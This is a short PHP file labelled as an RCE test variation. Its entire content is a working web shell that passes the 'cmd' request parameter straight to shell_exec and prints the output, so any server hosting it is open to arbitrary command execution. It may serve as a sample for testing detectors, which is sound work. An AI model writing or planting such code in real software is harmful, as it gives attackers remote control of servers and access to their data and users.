<?php
// RCE test variation #238
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>